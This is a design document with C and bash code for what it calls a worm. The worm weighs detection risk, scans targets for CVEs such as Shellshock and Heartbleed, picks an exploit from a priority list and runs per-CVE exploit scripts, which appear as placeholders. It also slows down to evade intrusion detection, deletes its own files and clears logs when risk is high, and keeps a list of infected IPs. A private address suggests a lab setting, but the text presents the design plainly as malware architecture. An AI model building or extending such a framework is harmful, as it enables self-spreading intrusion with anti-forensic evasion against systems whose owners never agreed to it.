# Phases & Flow: Detailed Implementation

## Phase 0: Risk Assessment (Detailed)

### Risk Signals

**Network-Level Signals**:
- Failed connections count
- Unusual traffic patterns
- IDS/IPS alerts (if detectable)
- Port scan detection
- Rate limiting encountered

**System-Level Signals**:
- CPU usage (0.0-1.0)
- Memory usage (0.0-1.0)
- Process anomalies
- File system anomalies
- Security log entries

**Behavioral Signals**:
- Failed operations count
- Rapid activity detection
- Resource exhaustion
- Time since last success

### Risk Calculation

```c
typedef struct {
    int network_risk;      // 0-10 (40% weight)
    int system_risk;       // 0-10 (30% weight)
    int behavioral_risk;   // 0-10 (30% weight)
    int total_risk;        // 0-10 (weighted sum)
} risk_assessment_t;

risk_assessment_t assess_risk(void) {
    risk_assessment_t risk = {0};
    
    // Collect signals
    network_signals_t net = collect_network_signals();
    system_signals_t sys = collect_system_signals();
    behavioral_signals_t beh = collect_behavioral_signals();
    
    // Calculate individual risks
    risk.network_risk = calculate_network_risk(net);
    risk.system_risk = calculate_system_risk(sys);
    risk.behavioral_risk = calculate_behavioral_risk(beh);
    
    // Weighted total
    risk.total_risk = (int)(
        (risk.network_risk * 0.40) +
        (risk.system_risk * 0.30) +
        (risk.behavioral_risk * 0.30)
    );
    
    return risk;
}
```

### Risk Thresholds

- **LOW (0-3)**: Proceed normally
- **MODERATE (4-6)**: Enter stealth mode
- **HIGH (7-10)**: Self-destruct

---

## Phase 1: Scan (Detailed)

### Engine Interface

```c
typedef struct {
    int cve_id;
    int is_vulnerable;      // 0 or 1
    int confidence;         // 0-10
    int port_open;         // Port number or 0
    int service_type;      // Service type or 0
} cve_scan_result_t;

typedef struct {
    cve_scan_result_t results[MAX_CVE_HANDLERS];
    int count;
} cve_result_vector_t;

cve_result_vector_t phase1_scan(void) {
    cve_result_vector_t vector = {0};
    
    // Call each registered scan handler
    for (int i = 0; i < num_handlers; i++) {
        vector.results[i] = call_scan_handler(handlers[i], target_ip);
    }
    
    return vector;
}
```

### Handler Implementation (Handler's Choice)

**Options** (each handler chooses):
1. **Local System Scanning**: File system, processes, packages (silent, no network)
2. **Passive Network Observation**: Analyze existing traffic (stealthy)
3. **Lightweight Active Probes**: Single connection, multiple tests (efficient)
4. **Pre-Configured Profiles**: Assume based on context (very stealthy, less accurate)

**Engine doesn't care HOW** - just calls handler and gets result.

---

## Phase 2: Decision (Detailed)

### Decision Rule Structure

```c
typedef struct {
    int cve_id;
    int priority_order;        // Order in list (1 = highest)
    int requires_vulnerable;   // Must be vulnerable
    int requires_port_open;    // Port requirement
    int min_confidence;        // Minimum confidence (0-10)
    int max_risk_level;        // Maximum risk to attempt (0-10)
    int stealth_required;      // Only in stealth mode (0 or 1)
} cve_decision_rule_t;
```

### Decision List Example

```c
cve_decision_rule_t decision_list[] = {
    // Priority 1: Shellshock
    {
        .cve_id = CVE_2014_6271,
        .priority_order = 1,
        .requires_vulnerable = 1,
        .requires_port_open = 80,
        .min_confidence = 7,
        .max_risk_level = 5,
        .stealth_required = 0
    },
    // Priority 2: Heartbleed
    {
        .cve_id = CVE_2014_0160,
        .priority_order = 2,
        .requires_vulnerable = 1,
        .requires_port_open = 443,
        .min_confidence = 6,
        .max_risk_level = 4,
        .stealth_required = 0
    },
    // ... more CVEs
};
```

### Decision Algorithm

```c
int selected_cve = 0;

for (int i = 0; i < num_decision_rules; i++) {
    cve_decision_rule_t* rule = &decision_list[i];
    
    // Check all conditions
    if (!check_vulnerable(rule, scan_results)) continue;
    if (!check_port(rule, scan_results)) continue;
    if (!check_confidence(rule, scan_results)) continue;
    if (!check_risk(rule, risk)) continue;
    if (!check_mode(rule, mode)) continue;
    
    // All conditions satisfied - select this CVE
    selected_cve = rule->cve_id;
    break;  // Stop at first match
}
```

---

## Phase 3: Execute (Detailed)

### Engine Interface

```c
int execute_exploit(int cve_id, const char* target_ip) {
    // Find handler for this CVE
    cve_handler_config_t* handler = find_handler(cve_id);
    if (!handler) return 0;
    
    // Call exploit script
    char command[512];
    snprintf(command, sizeof(command), "%s %s", 
             handler->exploit_script_path, target_ip);
    
    int result = system(command);
    return (result == 0) ? 1 : 0;  // 1 = success, 0 = failure
}
```

### Handler Script Interface

**Input**: Target IP as command-line argument
**Output**: Exit code (0 = success, non-zero = failure)

```bash
#!/bin/bash
# exploits/cve-2014-6271.sh

TARGET_IP="$1"

# Exploit implementation (author's responsibility)
# ... exploit code ...

exit 0  # Success
# or
exit 1  # Failure
```

---

## Degradation Modes (Detailed)

### Self-Destruction Mode

**When**: Risk >= 7

**Actions**:
1. Stop all operations
2. Kill child processes
3. Delete worm files
4. Remove temporary files
5. Clear logs
6. Exit cleanly

**Implementation**:
```c
void self_destruct(void) {
    // Stop operations
    cancel_all_operations();
    kill_child_processes();
    
    // Cleanup
    unlink("/tmp/worm");
    unlink("/tmp/worm.b64");
    system("rm -f /tmp/worm*");
    
    // Exit
    exit(0);
}
```

### Stealth Mode

**When**: Risk 4-6

**Actions**:
1. Increase delays (20s → 300s)
2. Reduce scan frequency
3. Use quieter CVEs only
4. Limit concurrent operations
5. Minimize footprint

**Implementation**:
```c
void enter_stealth_mode(void) {
    scan_delay = 300;  // 5 minutes
    max_concurrent = 1;
    use_quiet_cves_only = 1;
    
    // Perform minimal operations
    perform_stealth_operations();
    
    sleep(scan_delay);
    // Loop back to risk assessment
}
```

---

## State Management

### In-Memory State (Minimal)

**Purpose**: Track infected IPs to avoid duplicates

**Implementation**:
```c
char infected_ips[50][16];
int infected_count = 0;

int is_infected(const char* ip) {
    for (int i = 0; i < infected_count; i++) {
        if (strcmp(infected_ips[i], ip) == 0) return 1;
    }
    return 0;
}

void mark_infected(const char* ip) {
    if (!is_infected(ip) && infected_count < 50) {
        strcpy(infected_ips[infected_count++], ip);
    }
}
```

**Usage**:
```c
void infect_target(const char* ip) {
    // Skip if already infected
    if (is_infected(ip)) {
        return;
    }
    
    // Try to infect
    if (try_infection(ip)) {
        mark_infected(ip);
    }
}
```

**Benefits**: Simple, stealthy (no files), effective

---

## Complete Flow Example

```
Round 1:
  1. Risk Assessment → Risk = 2 (LOW) → Proceed
  2. Scan → CVE-2014-6271: Vulnerable, Confidence 8
  3. Decision → CVE-2014-6271 selected (Priority 1, all conditions met)
  4. Execute → CVE-2014-6271 exploit → Success
  5. Mark 172.28.1.3 as infected
  6. Sleep 20s

Round 2:
  1. Risk Assessment → Risk = 3 (LOW) → Proceed
  2. Scan → CVE-2014-6271: Vulnerable, Confidence 8
  3. Decision → CVE-2014-6271 selected
  4. Execute → Target 172.28.1.3 already infected → Skip
  5. Sleep 20s

Round 3:
  1. Risk Assessment → Risk = 5 (MODERATE) → Stealth Mode
  2. Stealth operations → Long delay (300s)
  3. Loop back to Risk Assessment
```

